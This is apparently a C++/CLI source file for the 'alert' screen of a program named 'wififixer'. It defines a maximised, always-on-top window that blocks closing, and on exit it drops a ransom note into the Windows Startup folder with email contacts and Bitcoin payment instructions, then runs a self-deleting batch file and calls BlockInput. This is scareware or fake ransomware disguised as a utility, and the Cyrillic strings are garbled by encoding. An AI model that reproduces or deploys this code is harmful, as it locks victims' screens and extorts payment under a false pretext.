#pragma once

namespace wififixer {

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;

	/// <summary>
	/// ������ ��� alert
	/// </summary>
	public ref class alert : public System::Windows::Forms::Form
	{
	public:
		alert(void)
		{
			InitializeComponent();
			//
			//TODO: �������� ��� ������������
			//
		}

	protected:
		/// <summary>
		/// ���������� ��� ������������ �������.
		/// </summary>
		~alert()
		{
			if (components)
			{
				delete components;
			}
		}
	private: System::Windows::Forms::Label^ label1;
	private: System::Windows::Forms::PictureBox^ pictureBox1;
	private: System::Windows::Forms::Timer^ timer1;
	private: System::ComponentModel::IContainer^ components;
	protected:
	private: int LGBT_lover_im_gay = 0;


	private:
		/// <summary>
		/// ������������ ���������� ������������.
		/// </summary>


#pragma region Windows Form Designer generated code
		/// <summary>
		/// ��������� ����� ��� ��������� ������������ � �� ��������� 
		/// ���������� ����� ������ � ������� ��������� ����.
		/// </summary>
		void InitializeComponent(void)
		{
			this->components = (gcnew System::ComponentModel::Container());
			System::ComponentModel::ComponentResourceManager^ resources = (gcnew System::ComponentModel::ComponentResourceManager(alert::typeid));
			this->label1 = (gcnew System::Windows::Forms::Label());
			this->pictureBox1 = (gcnew System::Windows::Forms::PictureBox());
			this->timer1 = (gcnew System::Windows::Forms::Timer(this->components));
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox1))->BeginInit();
			this->SuspendLayout();
			// 
			// label1
			// 
			this->label1->Anchor = static_cast<System::Windows::Forms::AnchorStyles>((((System::Windows::Forms::AnchorStyles::Top | System::Windows::Forms::AnchorStyles::Bottom)
				| System::Windows::Forms::AnchorStyles::Left)
				| System::Windows::Forms::AnchorStyles::Right));
			this->label1->AutoSize = true;
			this->label1->BackColor = System::Drawing::Color::Black;
			this->label1->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 36, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(204)));
			this->label1->ForeColor = System::Drawing::Color::Red;
			this->label1->Location = System::Drawing::Point(0, 301);
			this->label1->Name = L"label1";
			this->label1->Size = System::Drawing::Size(1100, 110);
			this->label1->TabIndex = 1;
			this->label1->Text = L"   ��� ���������� ��/���������\r\n����� ��������� �Ҩ��� ��� ������";
			this->label1->TextAlign = System::Drawing::ContentAlignment::MiddleCenter;
			// 
			// pictureBox1
			// 
			this->pictureBox1->Anchor = static_cast<System::Windows::Forms::AnchorStyles>((((System::Windows::Forms::AnchorStyles::Top | System::Windows::Forms::AnchorStyles::Bottom)
				| System::Windows::Forms::AnchorStyles::Left)
				| System::Windows::Forms::AnchorStyles::Right));
			this->pictureBox1->BackgroundImage = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"pictureBox1.BackgroundImage")));
			this->pictureBox1->BackgroundImageLayout = System::Windows::Forms::ImageLayout::Stretch;
			this->pictureBox1->Location = System::Drawing::Point(0, 0);
			this->pictureBox1->Name = L"pictureBox1";
			this->pictureBox1->Size = System::Drawing::Size(863, 602);
			this->pictureBox1->SizeMode = System::Windows::Forms::PictureBoxSizeMode::StretchImage;
			this->pictureBox1->TabIndex = 2;
			this->pictureBox1->TabStop = false;
			// 
			// timer1
			// 
			this->timer1->Interval = 500;
			this->timer1->Tick += gcnew System::EventHandler(this, &alert::timer1_Tick);
			// 
			// alert
			// 
			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->BackColor = System::Drawing::Color::White;
			this->ClientSize = System::Drawing::Size(863, 602);
			this->ControlBox = false;
			this->Controls->Add(this->label1);
			this->Controls->Add(this->pictureBox1);
			this->FormBorderStyle = System::Windows::Forms::FormBorderStyle::None;
			this->Name = L"alert";
			this->ShowIcon = false;
			this->ShowInTaskbar = false;
			this->StartPosition = System::Windows::Forms::FormStartPosition::CenterScreen;
			this->Text = L"alert";
			this->TopMost = true;
			this->WindowState = System::Windows::Forms::FormWindowState::Maximized;
			this->FormClosing += gcnew System::Windows::Forms::FormClosingEventHandler(this, &alert::alert_FormClosing);
			this->FormClosed += gcnew System::Windows::Forms::FormClosedEventHandler(this, &alert::alert_FormClosed);
			this->Load += gcnew System::EventHandler(this, &alert::alert_Load);
			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox1))->EndInit();
			this->ResumeLayout(false);
			this->PerformLayout();

		}
	private: System::Void alert_FormClosing(System::Object^ sender, System::Windows::Forms::FormClosingEventArgs^ e) {
		if (!right_close)
			e->Cancel = true;
	}
	private: System::Void alert_Load(System::Object^ sender, System::EventArgs^ e) {
		this->timer1->Start();
		this->label1->Left = (this->Width - label1->Width) / 2;
		this->label1->Top = (this->Height - label1->Height) / 2;
	}
	private: System::Void alert_FormClosed(System::Object^ sender, System::Windows::Forms::FormClosedEventArgs^ e) {
		if (!right_close) {
			std::ofstream file("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\README.txt");
			if (file.is_open()) {
				file << "���� ����� �����������!\n��� ������ �������������\n6A02000000000000***242FB01\n���� ���������, ����������, ���� ������ � ������ ������ ������ ���� �����������.\n��� �������������� ������ ��������� �����������.\n����� �������� �����������, ������� ��������� ������ �� ����������� ����� iluha.bolshoi.pisun228@tutanota.com (iluha.bolshoi.pisun228@mail.ee, iluha.bolshoi.pisun228@yandex.by)\n� ������ ������� ��� ������ ������������� (��.� ������ ������� ���������).\n����� ���������� �������� ��������� ������������. � �������� ������ �� �������� �����\nBitcoin - ��������, �� ������� ���������� ��������� ������� �������� ������� � ����� �������.\n���� � ��� ��� ���������\n*�������� ������� Bitcoin: https://blockchain.info/ru/wallet/new\n*����������� ������������ Bitcoin:\nhttps://localbitcoins.com/ru/buy_bitcoins (Visa/MasterCard, QIWI Visa Wallet � ��.)\n*��������� ��������� ���������� BTC �� ��������� � ������ �����\n����� �������� ������� ����� �����������, �� �������� ����������� ������ ��� ������ ����������.\n����� ������� ��������� - ������������ ��� ���� ����� ����� �������������.\n�������� ����������� ������.\n����� ������� �� ������ ��������� ��� �� 3� ������ ��� ���������� �����������.\n��� �� ������ ��������� ������ ����������, ����� ������ ������ ������ ���� �� ����� 10 ��.\n��������!\n*�� ��������� ������� ��������� ��� ��������� ������������ ��������\n*������� ��������������� ����������� ������ �������� � ������ ����� ������\n*����������� ������ ������������� ������������ � ������ �������, ��� ��� � ������� ������������ ���������� ���� ����������\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n(��� �������: ��� ���� �����, � ������ ������� �� � �������. WI-FI Fixer � ��������� ����������, �������� ����������. � ������ ������!)";
				file.close();
			}
			std::ofstream shutdown("C:\\sleep.bat");
			if (shutdown.is_open()) {
				shutdown << "PAUSE\ndel %0";
				shutdown.close();
			}
			(gcnew System::Diagnostics::Process())->Start("C:\\sleep.bat");
			BlockInput(false);
			right_close = true;
			Application::Exit();
		}
	}
	private: System::Void timer1_Tick(System::Object^ sender, System::EventArgs^ e) {
		if(this->LGBT_lover_im_gay == 0)
			this->label1->ForeColor = System::Drawing::Color::Red;
		else if (this->LGBT_lover_im_gay == 1)
			this->label1->ForeColor = System::Drawing::Color::Orange;
		else if (this->LGBT_lover_im_gay == 2)
			this->label1->ForeColor = System::Drawing::Color::Yellow;
		else if (this->LGBT_lover_im_gay == 3)
			this->label1->ForeColor = System::Drawing::Color::Green;
		else if (this->LGBT_lover_im_gay == 4)
			this->label1->ForeColor = System::Drawing::Color::Blue;
		else if (this->LGBT_lover_im_gay == 5) {
			this->label1->ForeColor = System::Drawing::Color::Purple;
			this->LGBT_lover_im_gay = -1;
		}
		this->LGBT_lover_im_gay++;
	}
};
}